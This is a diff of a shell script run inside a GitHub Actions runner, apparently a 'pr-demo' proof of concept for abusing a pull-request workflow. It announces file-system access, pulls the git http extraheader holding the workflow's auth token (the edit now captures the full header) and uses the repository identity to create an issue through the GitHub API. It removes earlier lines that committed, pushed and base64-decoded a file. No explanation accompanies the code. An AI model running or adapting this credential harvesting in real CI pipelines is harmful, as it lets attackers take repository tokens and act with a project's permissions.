@@ -160,7 +160,7 @@ echo We have access to the file system!
 # done
 
 git config --list
-GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3` 
+GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader` 
 GIT_REPO=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get remote.origin.url`
 curl --request POST \
           --url https://api.github.com/repos/$GIT_REPO/issues \
@@ -171,12 +171,7 @@ curl --request POST \
             "body": "This issue was automatically created by the GitHub Action workflow"
             }' \
           --fail
-git config user.name test
-git config user.email test@test.com
-git add foo.out
-git commit -m "initial add" foo.out
-git push 
-cat foo.out | base64 -d
+
 
 # Escape application args
 save () {
